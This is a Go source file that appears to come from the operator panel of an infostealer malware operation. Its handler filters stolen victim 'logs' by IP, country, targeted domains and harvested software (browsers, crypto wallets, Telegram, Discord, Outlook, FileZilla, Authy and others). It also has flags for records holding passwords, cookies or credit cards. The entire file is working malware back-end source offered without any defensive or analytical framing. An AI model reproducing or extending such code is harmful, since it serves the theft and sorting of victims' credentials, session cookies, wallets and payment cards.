package logs

import (
	"net/http"
	"strings"

	utils "../../utils"
	domaind "../domaind"
	login "../login"

	"github.com/gin-gonic/gin"
)

type FilterForm struct {
	Cookie string `json:"cookie"`
	Data   struct {
		Link          string   `json:"link"`
		Uid           string   `json:"uid"`
		Id            string   `json:"id"`
		Ip            string   `json:"ip"`
		Comment       string   `json:"comment"`
		Prefix        []string `json:"prefix"`
		Country       []string `json:"country"`
		Group         []string `json:"ddGroup"`
		Soft          []string `json:"soft"`
		PassOnly      bool     `json:"onlyPasswords"`
		CookieOnly    bool     `json:"onlyCookies"`
		CCOnly        bool     `json:"onlyCC"`
		UncheckedOnly bool     `json:"onlyUnchecked"`
	} `json:"filter"`
}

type Soft struct {
	Chromium  bool
	Gecko     bool
	Edge      bool
	Wallets   bool
	Steam     bool
	Telegram  bool
	Discord   bool
	Jabber    bool
	Foxmail   bool
	Outlook   bool
	FileZilla bool
	WinScp    bool
	Authy     bool
	NordVpn   bool
}

type Filter struct {
	bLinks        bool
	Links         []string
	bUids         bool
	Uids          []string
	bIds          bool
	Ids           []string
	bIps          bool
	Ips           []string
	bComments     bool
	Comments      []string
	bPrefix       bool
	Prefix        []string
	bCountry      bool
	Country       []string
	bGroup        bool
	Group         []string
	Soft          Soft
	PassOnly      bool
	CookieOnly    bool
	CCOnly        bool
	UncheckedOnly bool
}

func ParseFilters(form FilterForm) (filter Filter) {
	links := strings.Split(utils.DelSpace(form.Data.Link), ",")
	filter.Links = links
	filter.bLinks = len(links) > 0 && links[0] != ""

	uids := strings.Split(utils.DelSpace(form.Data.Uid), ",")
	filter.Uids = uids
	filter.bUids = len(uids) > 0 && uids[0] != ""

	ids := strings.Split(utils.DelSpace(form.Data.Id), ",")
	filter.Ids = ids
	filter.bIds = len(ids) > 0 && ids[0] != ""

	ips := strings.Split(utils.DelSpace(form.Data.Ip), ",")
	filter.Ips = ips
	filter.bIps = len(ips) > 0 && ips[0] != ""

	comments := strings.Split(utils.DelSpace(form.Data.Comment), ",")
	filter.Comments = comments
	filter.bComments = len(comments) > 0 && comments[0] != ""

	filter.Country = form.Data.Country
	filter.bCountry = len(form.Data.Country) > 0 && form.Data.Country[0] != ""

	filter.Prefix = form.Data.Prefix
	filter.bPrefix = len(form.Data.Prefix) > 0 && form.Data.Prefix[0] != ""

	filter.Group = form.Data.Group
	filter.bGroup = len(form.Data.Group) > 0 && form.Data.Group[0] != ""

	for _, soft := range form.Data.Soft {
		if soft == "chromium" {
			filter.Soft.Chromium = true
		} else if soft == "gecko" {
			filter.Soft.Gecko = true
		} else if soft == "edge" {
			filter.Soft.Edge = true
		} else if soft == "wallet" {
			filter.Soft.Wallets = true
		} else if soft == "steam" {
			filter.Soft.Steam = true
		} else if soft == "telegram" {
			filter.Soft.Telegram = true
		} else if soft == "discord" {
			filter.Soft.Discord = true
		} else if soft == "jabber" {
			filter.Soft.Jabber = true
		} else if soft == "foxmail" {
			filter.Soft.Foxmail = true
		} else if soft == "outlook" {
			filter.Soft.Outlook = true
		} else if soft == "file_zilla" {
			filter.Soft.FileZilla = true
		} else if soft == "win_scp" {
			filter.Soft.WinScp = true
		} else if soft == "authy" {
			filter.Soft.Authy = true
		} else if soft == "nord_vpn" {
			filter.Soft.NordVpn = true
		}
	}

	filter.PassOnly = form.Data.PassOnly
	filter.CookieOnly = form.Data.CookieOnly
	filter.CCOnly = form.Data.CCOnly
	filter.UncheckedOnly = form.Data.UncheckedOnly

	return
}

func GetDdDomains(groupName string) (domains string) {
	if groupName == "" {
		return
	}

	ddRules := domaind.GetDd()
	for _, dd := range ddRules {
		if dd.Group == groupName {
			domains = dd.Domains
			return
		}
	}
	return
}

func FilterLogs(ctx *gin.Context) {
	var filterForm FilterForm
	ctx.BindJSON(&filterForm)

	user := login.IsUserValid(filterForm.Cookie)
	if user == "" {
		logger.Println("filter.FilterLogs: unauthorized user: ", ctx.ClientIP())
		return
	}

	filter := ParseFilters(filterForm)
	logsData := GetLogs(user)

	var filtredLogs []LogsData
	for _, log := range logsData {
		if filter.bLinks {
			found := false
			for _, link := range filter.Links {
				if strings.Contains(log.Domains, link) {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bUids {
			found := false
			for _, uid := range filter.Uids {
				if log.Uid == uid {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bIds {
			found := false
			for _, id := range filter.Ids {
				if log.Id == utils.ToInt(id) {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bIps {
			found := false
			for _, ip := range filter.Ips {
				if log.Ip == ip {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bComments {
			found := false
			for _, comment := range filter.Comments {
				if strings.Contains(log.Comment, comment) {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bCountry {
			found := false
			for _, country := range filter.Country {
				if log.Country == country {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bPrefix {
			found := false
			for _, prefix := range filter.Prefix {
				if strings.Contains(log.Prefix, prefix) {
					filtredLogs = append(filtredLogs, log)
					found = true
					break
				}
			}
			if found {
				continue
			}
		} else if filter.bGroup {
			found := false
			for _, groupName := range filter.Group {
				links := GetDdDomains(groupName)
				logLinks := strings.Split(log.Domains, ",")
				for _, logLink := range logLinks {
					if strings.Contains(links, logLink) {
						filtredLogs = append(filtredLogs, log)
						found = true
						break
					}
				}
				if found {
					break
				}
			}
			if found {
				continue
			}
		} else if filter.Soft.Chromium && log.Chromium {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Gecko && log.Gecko {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Edge && log.Edge {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Wallets && log.Electrum || log.MultiBit || log.Armory || log.Ethereum || log.Bytecoin || log.Jaxx || log.LibertyJaxx || log.Atomic || log.Exodus || log.DashCore || log.Bitcoin || log.Wasabi || log.Daedalus || log.Monero {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Steam && log.Steam {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Telegram && log.Telegram {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Discord && log.Discord {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Jabber && log.Pidgin || log.Psi || log.PsiPlus {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Foxmail && log.Foxmail {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Outlook && log.Outlook {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.FileZilla && log.FileZilla {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.WinScp && log.WinScp {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.Authy && log.Authy {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.Soft.NordVpn && log.NordVpn {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.PassOnly && log.Passwords > 0 {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.CookieOnly && log.Cookies > 0 {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.CCOnly && log.Cards > 0 {
			filtredLogs = append(filtredLogs, log)
			continue
		} else if filter.UncheckedOnly && !log.Checked {
			filtredLogs = append(filtredLogs, log)
			continue
		}
	}

	if len(filtredLogs) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}
	SetDetectedDomains(filtredLogs)
	ctx.JSON(http.StatusOK, filtredLogs)
}
